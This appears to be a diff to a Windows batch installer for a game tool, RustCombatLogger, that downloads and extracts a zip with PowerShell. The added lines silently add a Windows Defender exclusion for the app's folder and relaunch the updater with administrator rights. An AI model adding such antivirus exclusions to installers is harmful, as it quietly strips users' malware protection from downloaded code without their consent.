@@ -28,6 +28,9 @@ if exist "%installDir%\RustCombatLogger" (
     echo Installation directory does not exist. Proceeding with installation...
 )
 
+:: Add windows defender exclusion
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%APPDATA%\RustCombatLogger'"
+
 :: Download the zip file
 echo Downloading %url%...
 powershell -command "Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%'"
@@ -45,6 +48,15 @@ powershell -command "Expand-Archive -Path '%zipfile%' -DestinationPath '%install
 :: Clean up
 echo Cleaning up...
 del "%zipfile%"
+
+:: Launch New updater if currently old
+set "scriptName=%~nx0"
+if "%scriptName%"=="RCLUpdater_old.bat" (
+    :: Launch RCLUpdater.bat
+    powershell -Command "start %installDir%\RustCombatLogger\RCLUpdater.bat -Verb RunAs"
+    :: Exit the current script
+    exit /b
+)
 
 :: Create a desktop shortcut
 echo Creating shortcut...
